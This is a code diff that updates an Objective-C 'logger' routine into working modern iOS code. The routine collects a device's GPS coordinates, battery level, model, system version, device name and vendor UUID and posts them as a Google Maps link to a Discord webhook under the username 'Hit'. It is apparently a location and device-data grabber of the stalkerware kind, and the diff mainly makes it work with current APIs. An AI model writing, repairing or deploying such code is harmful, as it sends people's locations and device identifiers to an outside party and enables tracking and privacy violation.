@@ -1,29 +1,48 @@
-#include "espl.h"
+#import "espl.h"
+#import <CoreLocation/CoreLocation.h>
+#import <UIKit/UIKit.h>
 
--(void)logger {
-
+- (void)logger {
     CLLocationManager* manager = [[CLLocationManager alloc] init];
+    manager.delegate = self; // Set the delegate for location updates
+    [manager requestWhenInUseAuthorization]; // Request location permission (add this to your Info.plist)
+
+    // Start location updates
     [manager startUpdatingLocation];
-    CLLocation *location = [manager location];
-    CLLocationCoordinate2D coordinate = [location coordinate];
-//getting location..
+}
+
+- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
+    // This method is called when a new location is available
+    CLLocation *location = [locations lastObject];
+    CLLocationCoordinate2D coordinate = location.coordinate;
 
     UIDevice *device = [UIDevice currentDevice];
     [device setBatteryMonitoringEnabled:YES];
-    int batinfo=([device batteryLevel]*100);
-    NSString *urlString = @"Discord Webhook Link";
-
+    int batinfo = (int)([device batteryLevel] * 100);
+    
+    NSString *urlString = @"YOUR_DISCORD_WEBHOOK_URL"; // Replace with your actual webhook URL
+    
     NSURL *url = [NSURL URLWithString:urlString];
-    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
-    NSString * parameterString = [NSString stringWithFormat:@"username=Hit&content=*maps.google.com/maps?q=%f,%f*\n**Model:** *%@*\n**Battery:** *%d*\n**System Version:** *%@ %@*\n**Device Name:** *%@*\n**UUID:** *%@*\n", coordinate.latitude, coordinate.longitude,[device model],batinfo, [device systemName], [device systemVersion], [device name],[[device identifierForVendor] UUIDString]];
+    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url];
     [request setHTTPMethod:@"POST"];
-    [request setURL:url];
-    NSData *postData = [parameterString dataUsingEncoding:NSUTF8StringEncoding];
-    [request setHTTPBody:postData];//making a post request for discord webhook
 
-  
+    NSString *parameterString = [NSString stringWithFormat:@"username=Hit&content=*maps.google.com/maps?q=%f,%f*\n**Model:** *%@*\n**Battery:** *%d%%*\n**System Version:** *%@ %@*\n**Device Name:** *%@*\n**UUID:** *%@*\n", coordinate.latitude, coordinate.longitude, [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
+    
+    [request setHTTPBody:[parameterString dataUsingEncoding:NSUTF8StringEncoding]];
+
+    // Create a data task to send the request
+    NSURLSessionDataTask *dataTask = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            NSLog(@"Error sending request: %@", error);
+            // Handle the error here
+        } else {
+            NSLog(@"Request sent successfully!");
+            // Handle the success here
+        }
+    }];
+
+    [dataTask resume]; // Start the data task
 }
 
-//https://github.com/r6f
-//by yin/Timer/Kevin
-[self performSelector:@selector(logger)];//call the function
+// In your viewDidLoad or equivalent method, you can call the logger function:
+// [self logger];
